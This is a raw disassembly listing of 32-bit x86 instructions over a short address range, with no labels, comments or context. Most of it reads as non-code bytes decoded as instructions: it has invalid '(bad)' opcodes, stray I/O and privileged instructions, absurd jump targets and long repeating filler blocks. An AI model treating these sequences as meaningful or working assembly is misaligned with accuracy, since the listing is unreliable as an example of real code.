  403796:	pop    esi
  403797:	mov    ebp,0xa5153098
  40379c:	xchg   ecx,eax
  40379d:	dec    esp
  40379e:	xor    ebp,DWORD PTR [ecx+0x41]
  4037a1:	push   ds
  4037a2:	inc    esi
  4037a3:	push   es
  4037a4:	inc    edx
  4037a5:	into   
  4037a6:	sub    eax,0x41a811d4
  4037ab:	xor    dl,BYTE PTR es:[edx+eiz*2]
  4037af:	test   al,0xac
  4037b1:	data16 xor BYTE PTR [ebp+edi*1+0x6342186d],dl
  4037b9:	push   edx
  4037ba:	fwait
  4037bb:	sub    al,0x10
  4037bd:	bound  eax,QWORD PTR [eax+0x41]
  4037c0:	and    eax,0x40000500
  4037c5:	inc    ebx
  4037c6:	add    eax,0x40624041
  4037cb:	inc    ebx
  4037cc:	add    eax,0x43402541
  4037d1:	bound  eax,QWORD PTR [eax+0x43]
  4037d4:	int3   
  4037d5:	inc    eax
  4037d6:	bound  eax,QWORD PTR [eax]
  4037d8:	inc    ecx
  4037d9:	inc    eax
  4037da:	inc    eax
  4037db:	add    eax,0xd4429605
  4037e0:	sub    dh,BYTE PTR [edx+edx*2+0x7f41ddc4]
  4037e7:	addr16 inc ebp
  4037e9:	imul   ecx,DWORD PTR [ebp+0x4f],0x32bad036
  4037f0:	sub    dl,BYTE PTR ds:0x7b6240ab
  4037f6:	out    dx,eax
  4037f7:	imul   edx,DWORD PTR [ecx],0xc95c4863
  4037fd:	dec    ecx
  4037fe:	inc    ebx
  4037ff:	arpl   WORD PTR [eax+0x51390c88],ax
  403805:	repnz push ecx
  403807:	jle    0x403816
  403809:	mov    BYTE PTR [edi],ch
  40380b:	ret    
  40380c:	mov    cl,0x25
  40380e:	inc    eax
  40380f:	xor    al,0xcd
  403811:	adc    esp,DWORD PTR [edx+0x40]
  403814:	and    eax,0x5406600
  403819:	inc    ebx
  40381a:	inc    ecx
  40381b:	inc    eax
  40381c:	inc    eax
  40381d:	inc    ebx
  40381e:	add    BYTE PTR [eax],al
  403820:	add    BYTE PTR [edx-0x34],ah
  403823:	inc    eax
  403824:	add    eax,0x40004041
  403829:	inc    ecx
  40382a:	int3   
  40382b:	add    BYTE PTR [ebx-0x7c],al
  40382e:	add    eax,0x5406240
  403833:	bound  ebx,QWORD PTR [eax-0x44]
  403836:	dec    esp
  403837:	shr    BYTE PTR ds:0x5e4101d,0x45
  40383e:	mov    esi,0xecae4911
  403843:	mov    bh,0xcb
  403845:	stos   DWORD PTR es:[di],eax
  403847:	jg     0x40388b
  403849:	push   ebp
  40384a:	add    eax,0xbe684aee
  40384f:	mov    cl,0x29
  403851:	inc    eax
  403852:	dec    edx
  403853:	cwde   
  403854:	xor    al,0x62
  403856:	jno    0x40388d
  403858:	push   ebx
  403859:	inc    eax
  40385a:	inc    edi
  40385b:	inc    eax
  40385c:	bound  ebx,QWORD PTR [eax+0x41]
  40385f:	add    eax,0x40404340
  403864:	inc    ebx
  403865:	inc    eax
  403866:	test   BYTE PTR [eax],al
  403868:	add    eax,0x40624041
  40386d:	inc    eax
  40386e:	add    BYTE PTR [edx+0x5],ah
  403871:	inc    ebx
  403872:	add    BYTE PTR [eax+0x78],al
  403875:	inc    ecx
  403876:	add    BYTE PTR [eax+0x41],bl
  403879:	bound  esp,QWORD PTR [edx+eax*2+0x42]
  40387d:	(bad)  
  40387f:	inc    eax
  403880:	dec    ebx
  403881:	fsub   QWORD PTR ds:0x503ca875
  403887:	xor    al,0xf8
  403889:	in     al,dx
  40388a:	(bad)  
  40388b:	fmul   QWORD PTR [edx]
  40388d:	sub    BYTE PTR [ecx+eax*4+0x40],dl
  403891:	add    eax,0xd2e2523e
  403896:	out    dx,eax
  403897:	inc    ecx
  403898:	xchg   DWORD PTR [edi+0x5f4b0f10],eax
  40389e:	cmp    edx,DWORD PTR [ebp+0x346240b8]
  4038a4:	hlt    
  4038a5:	retf   0x5f6b
  4038a8:	add    eax,0x56356141
  4038ad:	inc    eax
  4038ae:	test   BYTE PTR [eax],al
  4038b0:	int3   
  4038b1:	bound  eax,QWORD PTR ds:0xcc840f41
  4038b7:	inc    ebx
  4038b8:	add    BYTE PTR [eax+0x0],al
  4038bb:	inc    eax
  4038bc:	inc    eax
  4038bd:	inc    eax
  4038be:	int3   
  4038bf:	add    BYTE PTR ds:0x62404341,al
  4038c5:	pop    eax
  4038c6:	add    BYTE PTR [ebx+0x40],al
  4038c9:	bound  ecx,QWORD PTR [edi]
  4038cb:	inc    eax
  4038cc:	shl    BYTE PTR [ecx+0x40],1
  4038cf:	retf   
  4038d0:	xchg   ebx,eax
  4038d1:	xor    al,0x2a
  4038d3:	test   al,0xeb
  4038d5:	inc    ecx
  4038d6:	das    
  4038d7:	adc    BYTE PTR [eax],ah
  4038d9:	inc    eax
  4038da:	es inc eax
  4038dc:	jmp    0x5744c39
  4038e1:	mov    ah,0xd4
  4038e3:	imul   BYTE PTR [edi-0x78b7bfc7]
  4038e9:	inc    ecx
  4038ea:	push   edx
  4038eb:	addr16 dec esp
  4038ed:	arpl   WORD PTR [eax+0x2f],sp
  4038f0:	dec    edx
  4038f1:	jae    0x4038c3
  4038f3:	and    DWORD PTR [ecx+0x11],0x8e69859
  4038fa:	dec    eax
  4038fb:	push   0x554043d4
  403900:	out    0x52,al
  403902:	sub    DWORD PTR [ebx-0x28],esp
  403905:	adc    esp,DWORD PTR [ecx]
  403907:	shr    BYTE PTR [eax+0x40400000],0xf
  40390e:	inc    ecx
  40390f:	add    eax,0x40056243
  403914:	int3   
  403915:	add    ah,cl
  403917:	inc    eax
  403918:	inc    eax
  403919:	bound  eax,QWORD PTR [ecx+0x0]
  40391c:	add    BYTE PTR [edi],cl
  40391e:	inc    ebx
  40391f:	inc    eax
  403920:	inc    eax
  403921:	add    BYTE PTR [ecx+0x43],al
  403924:	add    eax,0x40256240
  403929:	bound  eax,QWORD PTR [eax]
  40392b:	push   0xffffffc3
  40392d:	inc    ecx
  40392e:	dec    ebx
  40392f:	inc    edx
  403930:	sub    esp,DWORD PTR [edx+0x74]
  403933:	mov    WORD PTR [eax+0x4077512a],gs
  403939:	dec    esi
  40393a:	push   0xffffffe0
  40393c:	inc    eax
  40393d:	pop    eax
  40393e:	inc    edx
  40393f:	js     0x403958
  403941:	test   al,0x62
  403943:	adc    al,0x2a
  403945:	xor    eax,0x50ea52e5
  40394a:	dec    eax
  40394b:	test   al,0x5
  40394d:	add    ah,cl
  40394f:	inc    eax
  403950:	inc    ecx
  403951:	inc    eax
  403952:	inc    ebx
  403953:	bound  esp,QWORD PTR ds:0x41400043
  403959:	add    BYTE PTR [eax],al
  40395b:	add    eax,0x43624062
  403960:	inc    ecx
  403961:	inc    eax
  403962:	inc    eax
  403963:	inc    eax
  403964:	add    eax,0x40624340
  403969:	add    eax,0x40664140
  40396e:	inc    ecx
  40396f:	inc    eax
  403970:	jp     0x4039a1
  403972:	inc    ebx
  403973:	sub    dl,BYTE PTR [ebx-0x3b]
  403976:	retf   
  403977:	dec    eax
  403978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403979:	jl     0x4039c1
  40397b:	inc    edx
  40397c:	cmp    eax,0x303928bf
  403981:	jo     0x4039cd
  403983:	inc    ebx
  403984:	add    BYTE PTR ds:0x41107840,al
  40398a:	bound  eax,QWORD PTR [eax+0x40]
  40398d:	sldt   WORD PTR [eax-0x34]
  403991:	js     0x4039f5
  403993:	add    eax,0x40664143
  403998:	inc    ebx
  403999:	add    BYTE PTR [ecx+0x5],al
  40399c:	js     0x4039de
  40399e:	bound  eax,QWORD PTR [eax+0x0]
  4039a1:	inc    eax
  4039a2:	or     al,0x57
  4039a4:	bound  edi,QWORD PTR [ebx-0x3d]
  4039a7:	xchg   bl,dh
  4039a9:	inc    eax
  4039aa:	in     al,dx
  4039ab:	adc    dh,BYTE PTR [ecx]
  4039ad:	call   0x4d50c2fa
  4039b2:	clc    
  4039b3:	test   al,0x0
  4039b5:	bound  ecx,QWORD PTR ds:0xa84050c4
  4039bb:	adc    DWORD PTR [edx+0x7f],edx
  4039be:	retf   
  4039bf:	sub    eax,0x8478692f
  4039c4:	mov    bl,0xe8
  4039c6:	dec    eax
  4039c7:	sar    BYTE PTR [edi],0x40
  4039ca:	cs or  eax,0x798f1228
  4039d0:	xchg   ecx,eax
  4039d1:	sub    eax,0x507fcb3e
  4039d6:	or     BYTE PTR [ebx-0x1d],dh
  4039d9:	inc    ecx
  4039da:	inc    ebx
  4039db:	inc    eax
  4039dc:	inc    eax
  4039dd:	add    eax,0x434162
  4039e2:	inc    eax
  4039e3:	add    BYTE PTR [edx+0x5],ah
  4039e6:	inc    eax
  4039e7:	adc    BYTE PTR [edx+0x40],ah
  4039ea:	inc    ebx
  4039eb:	inc    ecx
  4039ec:	add    eax,0x4340
  4039f1:	add    eax,0x404162
  4039f6:	add    BYTE PTR [eax+0x43],al
  4039f9:	inc    eax
  4039fa:	add    eax,0x1d4178c0
  4039ff:	adc    eax,0x79f00562
  403a04:	bound  ebp,QWORD PTR [edx]
  403a06:	and    ebx,ecx
  403a08:	mov    al,0xbf
  403a0a:	xor    al,BYTE PTR [eax+0x3d]
  403a0d:	pop    edx
  403a0e:	addr16 inc eax
  403a10:	add    eax,0x343443f1
  403a15:	inc    edi
  403a16:	fwait
  403a17:	inc    edx
  403a18:	xchg   DWORD PTR [eax+0x0],eax
  403a1b:	add    BYTE PTR [ecx+0x43],al
  403a1e:	add    eax,0x41784062
  403a23:	inc    eax
  403a24:	inc    eax
  403a25:	add    BYTE PTR [edi],cl
  403a27:	bound  eax,QWORD PTR [ebx+0x0]
  403a2a:	add    eax,0x25006240
  403a2f:	inc    eax
  403a30:	add    eax,0x40254143
  403a35:	add    eax,0x42620000
  403a3a:	rcr    bl,1
  403a3c:	arpl   ax,cx
  403a3e:	ins    BYTE PTR es:[edi],dx
  403a3f:	sbb    ch,BYTE PTR [eax+0x7a]
  403a42:	sub    eax,0x632c6741
  403a47:	sub    BYTE PTR [ecx+0x53],al
  403a4a:	jle    0x403a1d
  403a4c:	inc    ebx
  403a4d:	inc    esi
  403a4e:	xor    eax,ebp
  403a50:	push   ebx
  403a51:	adc    DWORD PTR [edi+0x40],eax
  403a54:	push   ecx
  403a55:	sub    al,0x33
  403a57:	or     eax,0x43926324
  403a5c:	add    BYTE PTR [eax],al
  403a5e:	add    BYTE PTR [ecx+0x40],al
  403a61:	bound  esp,QWORD PTR [esi+0x0]
  403a64:	inc    eax
  403a65:	add    eax,0x5400000
  403a6a:	inc    ecx
  403a6b:	inc    eax
  403a6c:	inc    eax
  403a6d:	bound  esp,QWORD PTR ds:0x25050043
  403a73:	inc    ecx
  403a74:	inc    ebx
  403a75:	inc    eax
  403a76:	test   BYTE PTR [eax+0x0],al
  403a79:	bound  ebx,QWORD PTR [eax+0x62]
  403a7c:	inc    ecx
  403a7d:	inc    eax
  403a7e:	das    
  403a7f:	push   ebx
  403a80:	xchg   esp,eax
  403a81:	add    ebp,ecx
  403a83:	(bad)  
  403a84:	fnstenv [ebx+eiz*8]
  403a87:	inc    ebx
  403a88:	xchg   esp,eax
  403a89:	arpl   WORD PTR [esp+edx*8+0x56],ax
  403a8d:	dec    edi
  403a8e:	dec    eax
  403a8f:	shr    BYTE PTR [eax+0x5e63fb20],1
  403a95:	repnz push 0x98b16728
  403a9b:	shl    BYTE PTR [ebp+0x7c],cl
  403a9e:	inc    eax
  403a9f:	inc    eax
  403aa0:	pop    ebx
  403aa1:	adc    BYTE PTR [edx+0x40],ah
  403aa4:	inc    ecx
  403aa5:	and    eax,0x40000500
  403aaa:	inc    ebx
  403aab:	add    eax,0x40624041
  403ab0:	inc    ebx
  403ab1:	add    eax,0x43402541
  403ab6:	bound  eax,QWORD PTR [eax+0x43]
  403ab9:	int3   
  403aba:	inc    eax
  403abb:	bound  eax,QWORD PTR [eax]
  403abd:	inc    ecx
  403abe:	inc    eax
  403abf:	inc    eax
  403ac0:	add    eax,0xa8152905
  403ac5:	pop    esp
  403ac6:	inc    ecx
  403ac7:	hlt    
  403ac8:	sub    ah,BYTE PTR [edx+0x1e]
  403acb:	leave  
  403acc:	inc    ebx
  403acd:	jb     0x403aa1
  403acf:	pop    ds
  403ad0:	inc    edx
  403ad1:	adc    BYTE PTR [eax+0x26],dh
  403ad4:	sub    bl,dh
  403ad6:	jle    0x403b09
  403ad8:	retf   0x6384
  403adb:	inc    ecx
  403adc:	adc    BYTE PTR [ebp+0x5544473],ah
  403ae2:	push   ecx
  403ae3:	sbb    al,0x5c
  403ae5:	xchg   esp,eax
  403ae6:	outs   dx,DWORD PTR ss:[esi]
  403ae8:	(bad)  
  403ae9:	int    0xa8
  403aeb:	enter  0xa043,0x62
  403aef:	inc    eax
  403af0:	and    eax,0x5406600
  403af5:	inc    ebx
  403af6:	inc    ecx
  403af7:	inc    eax
  403af8:	inc    eax
  403af9:	inc    ebx
  403afa:	add    BYTE PTR [eax],al
  403afc:	add    BYTE PTR [edx-0x34],ah
  403aff:	inc    eax
  403b00:	add    eax,0x40004041
  403b05:	inc    ecx
  403b06:	int3   
  403b07:	add    BYTE PTR [ebx-0x7c],al
  403b0a:	add    eax,0x5406240
  403b0f:	bound  edx,QWORD PTR ds:0x1212645b
  403b15:	pop    ebx
  403b16:	sbb    al,0xbe
  403b18:	jl     0x403b5f
  403b1a:	aam    0xf0
  403b1c:	sar    BYTE PTR [eax+ebx*8],1
  403b1f:	cli    
  403b20:	mov    esi,0x1515d961
  403b25:	xchg   esp,eax
  403b26:	adc    ah,al
  403b28:	inc    eax
  403b29:	bound  ebx,QWORD PTR [eax+0x41]
  403b2c:	add    eax,0x40404340
  403b31:	inc    ebx
  403b32:	inc    eax
  403b33:	test   BYTE PTR [eax],al
  403b35:	add    eax,0x40624041
  403b3a:	inc    eax
  403b3b:	add    BYTE PTR [edx+0x5],ah
  403b3e:	inc    ebx
  403b3f:	add    BYTE PTR [eax+0x78],al
  403b42:	inc    ecx
  403b43:	add    BYTE PTR [eax+0x41],bl
  403b46:	bound  edi,QWORD PTR [edi-0x3232f5c0]
  403b4c:	sub    DWORD PTR [eax+0x71],esp
  403b4f:	inc    eax
  403b50:	daa    
  403b51:	test   BYTE PTR [ebp+0x11],al
  403b54:	fld    DWORD PTR [edx+0x527140a3]
  403b5a:	sub    eax,0xbfc30498
  403b5f:	pusha  
  403b60:	inc    eax
  403b61:	cwde   
  403b62:	xor    al,0xd
  403b64:	call   0x30025daa
  403b69:	jl     0x403b5b
  403b6b:	inc    esi
  403b6c:	pop    es
  403b6d:	xor    esp,DWORD PTR [ebp+0x14]
  403b70:	sbb    dl,BYTE PTR [ebx+0x40]
  403b73:	test   BYTE PTR [eax],al
  403b75:	int3   
  403b76:	bound  eax,QWORD PTR ds:0xcc840f41
  403b7c:	inc    ebx
  403b7d:	add    BYTE PTR [eax+0x0],al
  403b80:	inc    eax
  403b81:	inc    eax
  403b82:	inc    eax
  403b83:	int3   
  403b84:	add    BYTE PTR ds:0x62404341,al
  403b8a:	pop    eax
  403b8b:	add    BYTE PTR [ebx+0x40],al
  403b8e:	bound  ecx,QWORD PTR [edi]
  403b90:	inc    eax
  403b91:	arpl   WORD PTR [edx+ebp*8+0x53404a64],sp
  403b98:	and    DWORD PTR gs:[eax+0x7da86242],edx
  403b9f:	inc    eax
  403ba0:	or     ah,BYTE PTR [edi+0x55]
  403ba3:	and    al,0xab
  403ba5:	add    BYTE PTR [edi+0x21],ch
  403ba8:	sub    eax,0x4f868720
  403bad:	mov    bl,0x43
  403baf:	inc    edi
  403bb0:	add    BYTE PTR [eax],al
  403bb2:	inc    eax
  403bb3:	inc    eax
  403bb4:	cmovno eax,DWORD PTR ds:0x40056243
  403bbb:	int3   
  403bbc:	add    ah,cl
  403bbe:	inc    eax
  403bbf:	inc    eax
  403bc0:	bound  eax,QWORD PTR [ecx+0x0]
  403bc3:	add    BYTE PTR [edi],cl
  403bc5:	inc    ebx
  403bc6:	inc    eax
  403bc7:	inc    eax
  403bc8:	add    BYTE PTR [ecx+0x43],al
  403bcb:	add    eax,0x40256240
  403bd0:	bound  eax,QWORD PTR [eax]
  403bd2:	push   ebx
  403bd3:	pusha  
  403bd4:	xor    al,0xa8
  403bd6:	std    
  403bd7:	xchg   esi,eax
  403bd8:	or     DWORD PTR [eax-0x37],eax
  403bdb:	bound  ebp,QWORD PTR [ebp+0x10]
  403bde:	fcomp  QWORD PTR [edi+esi*2+0x65c4d024]
  403be5:	lods   al,BYTE PTR ds:[esi]
  403be6:	test   al,0x94
  403be8:	dec    edx
  403be9:	dec    edi
  403bea:	bound  ecx,QWORD PTR [edi-0x18]
  403bed:	inc    ecx
  403bee:	adc    DWORD PTR [ebx],esp
  403bf0:	xor    BYTE PTR [eax+0x6],al
  403bf3:	mov    ebx,0xd05c5b85
  403bf8:	add    al,0x30
  403bfa:	xor    BYTE PTR [edx],0x91
  403bfd:	cmp    BYTE PTR [ecx+0x4f],al
  403c00:	inc    edx
  403c01:	inc    ebx
  403c02:	ss cld 
  403c04:	arpl   WORD PTR [eax+0x5],dx
  403c07:	add    ah,cl
  403c09:	inc    eax
  403c0a:	inc    ecx
  403c0b:	inc    eax
  403c0c:	inc    ebx
  403c0d:	bound  esp,QWORD PTR ds:0x41400043
  403c13:	add    BYTE PTR [eax],al
  403c15:	add    eax,0x43624062
  403c1a:	inc    ecx
  403c1b:	inc    eax
  403c1c:	inc    eax
  403c1d:	inc    eax
  403c1e:	add    eax,0x40624340
  403c23:	add    eax,0x40664140
  403c28:	inc    edi
  403c29:	fnsave [eax]
  403c2b:	inc    eax
  403c2c:	or     BYTE PTR ds:0x34942ae6,al
  403c32:	add    ebp,DWORD PTR [ebx]
  403c34:	gs leave 
  403c36:	adc    eax,0x5aaa8092
  403c3b:	jmp    0xabc3:0xbf4518e9
  403c42:	dec    edx
  403c43:	jmp    0x1078:0x40050043
  403c4a:	inc    ecx
  403c4b:	bound  eax,QWORD PTR [eax+0x40]
  403c4e:	sldt   WORD PTR [eax-0x34]
  403c52:	js     0x403cb6
  403c54:	add    eax,0x40664143
  403c59:	inc    ebx
  403c5a:	add    BYTE PTR [ecx+0x5],al
  403c5d:	js     0x403c9f
  403c5f:	bound  eax,QWORD PTR [eax+0x0]
  403c62:	inc    eax
  403c63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c64:	aaa    
  403c65:	repnz ins BYTE PTR es:[edi],dx
  403c67:	mov    esp,0x62409590
  403c6c:	(bad)  
  403c6d:	cli    
  403c6e:	inc    edx
  403c6f:	cmc    
  403c70:	scas   eax,DWORD PTR es:[edi]
  403c71:	fnstenv [edi]
  403c73:	in     al,0xa8
  403c75:	in     al,0xc0
  403c77:	das    
  403c78:	lock test DWORD PTR [eax-0x28],0x433c0d44
  403c80:	mov    bl,BYTE PTR [ebx+0x6e]
  403c83:	fs push edx
  403c85:	inc    ecx
  403c86:	(bad)  
  403c88:	pop    edi
  403c89:	jno    0x403c2d
  403c8b:	dec    ecx
  403c8c:	sub    al,bl
  403c8e:	cwde   
  403c8f:	xor    al,0xb8
  403c91:	rol    BYTE PTR [ecx+0x38],0x24
  403c95:	or     eax,0x418a40a8
  403c9a:	inc    ebx
  403c9b:	inc    eax
  403c9c:	inc    eax
  403c9d:	add    eax,0x434162
  403ca2:	inc    eax
  403ca3:	add    BYTE PTR [edx+0x5],ah
  403ca6:	inc    eax
  403ca7:	adc    BYTE PTR [edx+0x40],ah
  403caa:	inc    ebx
  403cab:	inc    ecx
  403cac:	add    eax,0x4340
  403cb1:	add    eax,0x404162
  403cb6:	add    BYTE PTR [eax+0x43],al
  403cb9:	inc    eax
  403cba:	add    eax,0xb8a842f3
  403cbf:	stc    
  403cc0:	adc    DWORD PTR [ecx],edi
  403cc2:	outs   dx,BYTE PTR ds:[esi]
  403cc3:	popa   
  403cc4:	inc    eax
  403cc5:	in     al,0x18
  403cc7:	loop   0x403cb1
  403cc9:	outs   dx,BYTE PTR ds:[esi]
  403cca:	adc    dl,BYTE PTR [ecx+0x6f]
  403ccd:	daa    
  403cce:	mov    esi,0x404243
  403cd3:	add    BYTE PTR [ecx+0x43],al
  403cd6:	add    eax,0x41784062
  403cdb:	inc    eax
  403cdc:	inc    eax
  403cdd:	add    BYTE PTR [edi],cl
  403cdf:	bound  eax,QWORD PTR [ebx+0x0]
  403ce2:	add    eax,0x25006240
  403ce7:	inc    eax
  403ce8:	add    eax,0x40254143
  403ced:	add    eax,0x64620000
  403cf2:	sti    
  403cf3:	dec    ecx
  403cf4:	push   esi
  403cf5:	bound  esp,QWORD PTR [ebx-0x15]
  403cf8:	sub    al,0x43
  403cfa:	lods   eax,DWORD PTR ds:[esi]
  403cfb:	jne    0x403d3d
  403cfd:	les    ebx,FWORD PTR [edx-0x16268bff]
  403d03:	inc    ecx
  403d04:	int    0x4f
  403d06:	stos   DWORD PTR es:[edi],eax
  403d07:	clc    
  403d08:	bound  ecx,QWORD PTR [ebx+0x4b]
  403d0b:	push   edi
  403d0c:	xor    BYTE PTR [edx],ah
  403d0e:	nop
  403d0f:	loopne 0x403d15
  403d11:	inc    ebx
  403d12:	xchg   esp,eax
  403d13:	mov    eax,DWORD PTR [edx+0x5e]
  403d16:	mov    edi,0x20992aae
  403d1b:	push   ebx
  403d1c:	inc    eax
  403d1d:	push   ebx
  403d1e:	inc    eax
  403d1f:	(bad)  
  403d20:	dec    edi
  403d21:	rcr    DWORD PTR [ebx-0x41],cl
  403d24:	xor    al,0x97
  403d26:	retf   
  403d27:	retw   0x43
  403d2b:	add    BYTE PTR [eax],al
  403d2d:	inc    ecx
  403d2e:	inc    eax
  403d2f:	bound  esp,QWORD PTR [esi+0x0]
  403d32:	inc    eax
  403d33:	add    eax,0x5400000
  403d38:	inc    ecx
  403d39:	inc    eax
  403d3a:	inc    eax
  403d3b:	bound  esp,QWORD PTR ds:0x25050043
  403d41:	inc    ecx
  403d42:	inc    ebx
  403d43:	inc    eax
  403d44:	test   BYTE PTR [eax+0x0],al
  403d47:	bound  ebx,QWORD PTR [eax+0x62]
  403d4a:	inc    ecx
  403d4b:	inc    eax
  403d4c:	inc    eax
  403d4d:	mov    BYTE PTR [edx+0x56],al
  403d50:	cmp    al,0xbf
  403d52:	ficom  WORD PTR [ebx+0x39]
  403d55:	jecxz  0x403d07
  403d57:	inc    edx
  403d58:	inc    ebp
  403d59:	mov    edi,0x276ebcdc
  403d5e:	pusha  
  403d5f:	jp     0x403d0b
  403d61:	pop    eax
  403d62:	and    eax,0x566b6005
  403d67:	inc    esi
  403d68:	test   al,0x67
  403d6a:	retfw  
  403d6c:	adc    BYTE PTR [edx+0x40],ah
  403d6f:	inc    ecx
  403d70:	and    eax,0x40000500
  403d75:	inc    ebx
  403d76:	add    eax,0x40624041
  403d7b:	inc    ebx
  403d7c:	add    eax,0x43402541
  403d81:	bound  eax,QWORD PTR [eax+0x43]
  403d84:	int3   
  403d85:	inc    eax
  403d86:	bound  eax,QWORD PTR [eax]
  403d88:	inc    ecx
  403d89:	inc    eax
  403d8a:	inc    eax
  403d8b:	add    eax,0xd71e4305
  403d90:	inc    eax
  403d91:	sub    BYTE PTR [eax+0x73d948dc],ch
  403d97:	pop    ecx
  403d98:	xor    dl,BYTE PTR [edi]
  403d9a:	adc    al,BYTE PTR ds:0x75986a41
  403da0:	cli    
  403da1:	(bad)  
  403da3:	fldenv [edx+0x40]
  403da6:	and    eax,0x5406600
  403dab:	inc    ebx
  403dac:	inc    ecx
  403dad:	inc    eax
  403dae:	inc    eax
  403daf:	inc    ebx
  403db0:	add    BYTE PTR [eax],al
  403db2:	add    BYTE PTR [edx-0x34],ah
  403db5:	inc    eax
  403db6:	add    eax,0x40004041
  403dbb:	inc    ecx
  403dbc:	int3   
  403dbd:	add    BYTE PTR [ebx-0x7c],al
  403dc0:	add    eax,0x5406240
  403dc5:	(bad)  
  403dc6:	retf   0x76a8
  403dc9:	inc    ebx
  403dca:	inc    ecx
  403dcb:	test   al,0x54
  403dcd:	out    dx,al
  403dce:	sbb    al,0x45
  403dd0:	(bad)  
  403dd1:	rcl    DWORD PTR ds:0x6263cb45,1
  403dd7:	mov    BYTE PTR [ebx],0xca
  403dda:	push   esi
  403ddb:	popa   
  403ddc:	mov    al,0x5
  403dde:	hlt    
  403ddf:	mov    esp,0x364033f2
  403de4:	or     eax,0x82f298f8
  403de9:	shl    DWORD PTR [edx+eiz*2],0x4e
  403ded:	fisub  DWORD PTR [edx-0x58]
  403df0:	add    BYTE PTR [esi+0x5e],bl
  403df3:	scas   al,BYTE PTR es:[edi]
  403df4:	push   0x14
  403df6:	fwait
  403df7:	inc    eax
  403df8:	bound  ebx,QWORD PTR [eax+0x41]
  403dfb:	add    eax,0x40404340
  403e00:	inc    ebx
  403e01:	inc    eax
  403e02:	test   BYTE PTR [eax],al
  403e04:	add    eax,0x40624041
  403e09:	inc    eax
  403e0a:	add    BYTE PTR [edx+0x5],ah
  403e0d:	inc    ebx
  403e0e:	add    BYTE PTR [eax+0x78],al
  403e11:	inc    ecx
  403e12:	add    BYTE PTR [eax+0x41],bl
  403e15:	bound  eax,QWORD PTR [eax-0x72]
  403e18:	push   0xcfa0bc40
  403e1d:	xor    al,0xef
  403e1f:	cli    
  403e20:	(bad)  
  403e21:	xor    eax,0x7f5e627d
  403e26:	pop    DWORD PTR [bx+0x3a]
  403e2a:	ret    
  403e2b:	push   ebp
  403e2c:	fdiv   DWORD PTR [edx-0x7f]
  403e2f:	cmc    
  403e30:	pop    edi
  403e31:	inc    eax
  403e32:	inc    ecx
  403e33:	xor    ecx,DWORD PTR ds:0x241ec355
  403e39:	es in  al,0xb8
  403e3c:	fld    DWORD PTR [eax-0x37]
  403e3f:	inc    ebp
  403e40:	mov    bl,0xd6
  403e42:	rcl    BYTE PTR ds:0x92365f26,0x56
  403e49:	inc    edx
  403e4a:	bound  edi,QWORD PTR [ebx+0x64]
  403e4d:	push   ecx
  403e4e:	pop    esp
  403e4f:	fs inc eax
  403e51:	test   BYTE PTR [eax],al
  403e53:	int3   
  403e54:	bound  eax,QWORD PTR ds:0xcc840f41
  403e5a:	inc    ebx
  403e5b:	add    BYTE PTR [eax+0x0],al
  403e5e:	inc    eax
  403e5f:	inc    eax
  403e60:	inc    eax
  403e61:	int3   
  403e62:	add    BYTE PTR ds:0x62404341,al
  403e68:	pop    eax
  403e69:	add    BYTE PTR [ebx+0x40],al
  403e6c:	bound  ecx,QWORD PTR [edi]
  403e6e:	inc    eax
  403e6f:	xchg   ecx,eax
  403e70:	and    ah,bl
  403e72:	xchg   esp,eax
  403e73:	stc    
  403e74:	push   edx
  403e75:	sti    
  403e76:	test   BYTE PTR [edi-0x16],0xa4
  403e7a:	adc    eax,0x673151d6
  403e7f:	pop    ecx
  403e80:	push   ds
  403e81:	arpl   bx,cx
  403e83:	add    eax,0x400000e0
  403e88:	inc    eax
  403e89:	cmovno eax,DWORD PTR ds:0x40056243
  403e90:	int3   
  403e91:	add    ah,cl
  403e93:	inc    eax
  403e94:	inc    eax
  403e95:	bound  eax,QWORD PTR [ecx+0x0]
  403e98:	add    BYTE PTR [edi],cl
  403e9a:	inc    ebx
  403e9b:	inc    eax
  403e9c:	inc    eax
  403e9d:	add    BYTE PTR [ecx+0x43],al
  403ea0:	add    eax,0x40256240
  403ea5:	bound  eax,QWORD PTR [eax]
  403ea7:	bound  ecx,QWORD PTR [ecx-0x6b41bdaa]
  403ead:	leave  
  403eae:	sbb    BYTE PTR [ebx-0x72],cl
  403eb1:	fisub  WORD PTR [ecx]
  403eb3:	cwde   
  403eb4:	or     eax,0x87095926
  403eb9:	inc    edi
  403eba:	inc    eax
  403ebb:	and    eax,0xa8bd42c9
  403ec0:	dec    esp
  403ec1:	jg     0x403ec8
  403ec3:	add    ah,cl
  403ec5:	inc    eax
  403ec6:	inc    ecx
  403ec7:	inc    eax
  403ec8:	inc    ebx
  403ec9:	bound  esp,QWORD PTR ds:0x41400043
  403ecf:	add    BYTE PTR [eax],al
  403ed1:	add    eax,0x43624062
  403ed6:	inc    ecx
  403ed7:	inc    eax
  403ed8:	inc    eax
  403ed9:	inc    eax
  403eda:	add    eax,0x40624340
  403edf:	add    eax,0x40664140
  403ee4:	and    ebp,DWORD PTR [eax+0x4041bb41]
  403eea:	ret    
  403eeb:	imul   esp,DWORD PTR [edx+0x54],0x4160c481
  403ef2:	ficom  WORD PTR [eax+eax*2+0x42]
  403ef6:	ret    
  403ef7:	push   edx
  403ef8:	arpl   WORD PTR [edi],bx
  403efa:	mov    al,0xf3
  403efc:	js     0x403ec4
  403efe:	inc    ebx
  403eff:	add    BYTE PTR ds:0x41107840,al
  403f05:	bound  eax,QWORD PTR [eax+0x40]
  403f08:	sldt   WORD PTR [eax-0x34]
  403f0c:	js     0x403f70
  403f0e:	add    eax,0x40664143
  403f13:	inc    ebx
  403f14:	add    BYTE PTR [ecx+0x5],al
  403f17:	js     0x403f59
  403f19:	bound  eax,QWORD PTR [eax+0x0]
  403f1c:	inc    eax
  403f1d:	xchg   esp,eax
  403f1e:	clc    
  403f1f:	cmp    al,0xec
  403f21:	cmp    BYTE PTR [ebp-0x2bf203c0],bh
  403f27:	adc    BYTE PTR [edx-0x4f],ah
  403f2a:	ja     0x403fa0
  403f2c:	retfw  
  403f2e:	fiadd  DWORD PTR [eax]
  403f30:	add    eax,0x3bc853d7
  403f35:	dec    ecx
  403f36:	push   ss
  403f37:	inc    esi
  403f38:	xchg   eax,ebp
  403f3a:	pop    edx
  403f3b:	inc    eax
  403f3c:	lock stos DWORD PTR es:[edi],eax
  403f3e:	data16 cs cmp al,0xe9
  403f42:	mov    bl,0x70
  403f44:	mov    ah,0x41
  403f46:	shl    BYTE PTR [eax+ebx*4+0x7d],cl
